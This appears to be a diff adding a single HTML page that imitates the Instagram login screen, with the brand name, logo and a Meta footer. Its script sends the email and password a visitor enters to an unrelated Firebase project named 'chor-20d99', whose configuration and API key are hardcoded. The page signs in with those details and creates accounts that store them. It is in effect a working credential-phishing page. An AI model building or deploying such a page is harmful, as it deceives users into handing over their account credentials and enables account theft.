@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 350px;
+        }
+
+        .logo {
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            width: 120px;
+        }
+
+        .input-field {
+            width: 100%;
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+
+        .show-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #0095f6;
+            font-size: 12px;
+        }
+
+        .show-password:hover {
+            text-decoration: underline;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #0077cc;
+        }
+
+        .or-divider {
+            width: 100%;
+            text-align: center;
+            border-bottom: 1px solid #dbdbdb;
+            line-height: 0.1em;
+            margin: 20px 0;
+        }
+
+        .or-divider span {
+            background: white;
+            padding: 0 10px;
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+
+        .forgot-password {
+            margin-top: 15px;
+            color: #00376b;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .signup-link {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .signup-link p {
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+
+        .signup-link a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .footer {
+            margin-top: 50px;
+            color: #8e8e8e;
+            font-size: 12px;
+            text-align: center;
+        }
+
+        .footer a {
+            color: #00376b;
+            text-decoration: none;
+        }
+
+        .loading-spinner {
+            display: none;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0095f6;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin-top: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="lol.jpg" alt="Instagram Logo">
+        </div>
+        <div class="input-field">
+            <input type="email" id="email" placeholder="Email">
+        </div>
+        <div class="input-field">
+            <input type="password" id="password" placeholder="Password">
+            <span class="show-password" onclick="togglePassword()">Show</span>
+        </div>
+        <button onclick="login()">Log in</button>
+        <button onclick="signup()">Sign Up</button>
+        <div class="or-divider"><span>OR</span></div>
+        <a href="#" class="forgot-password">Forgot password?</a>
+        <div class="footer">
+            <a href="#">Meta</a> &copy; 2023
+        </div>
+        <div class="loading-spinner" id="loadingSpinner"></div>
+    </div>
+
+    <script type="module">
+        // Import Firebase functions
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
+        import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-auth.js";
+
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyC_lwb8YdBokuAO0K4rrXj6u9K4zYODb9A",
+            authDomain: "chor-20d99.firebaseapp.com",
+            projectId: "chor-20d99",
+            storageBucket: "chor-20d99.firebasestorage.app",
+            messagingSenderId: "203004086083",
+            appId: "1:203004086083:web:4fcb1f98b2428eab1651f6",
+            measurementId: "G-93GJP9C425"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+
+        // Function to handle login
+        window.login = function () {
+            let email = document.getElementById("email").value.trim();
+            let password = document.getElementById("password").value.trim();
+            let loadingSpinner = document.getElementById("loadingSpinner");
+
+            if (email === "" || password === "") {
+                alert("Please enter both email and password.");
+                return;
+            }
+
+            loadingSpinner.style.display = "block";
+
+            signInWithEmailAndPassword(auth, email, password)
+                .then((userCredential) => {
+                    loadingSpinner.style.display = "none";
+                    alert("Login successful!");
+                    console.log("User:", userCredential.user);
+                })
+                .catch((error) => {
+                    loadingSpinner.style.display = "none";
+                    alert("Login failed: " + error.message);
+                });
+        };
+
+        // Function to handle signup
+        window.signup = function () {
+            let email = document.getElementById("email").value.trim();
+            let password = document.getElementById("password").value.trim();
+
+            if (email === "" || password === "") {
+                alert("Please enter email and password.");
+                return;
+            }
+
+            createUserWithEmailAndPassword(auth, email, password)
+                .then((userCredential) => {
+                    alert("Signup successful! You can now log in.");
+                    console.log("User:", userCredential.user);
+                })
+                .catch((error) => {
+                    alert("Signup failed: " + error.message);
+                });
+        };
+
+        // Show/Hide Password Function
+        window.togglePassword = function () {
+            let passwordField = document.getElementById("password");
+            let showPasswordText = document.querySelector(".show-password");
+
+            if (passwordField.type === "password") {
+                passwordField.type = "text";
+                showPasswordText.textContent = "Hide";
+            } else {
+                passwordField.type = "password";
+                showPasswordText.textContent = "Show";
+            }
+        };
+    </script>
+</body>
+</html>
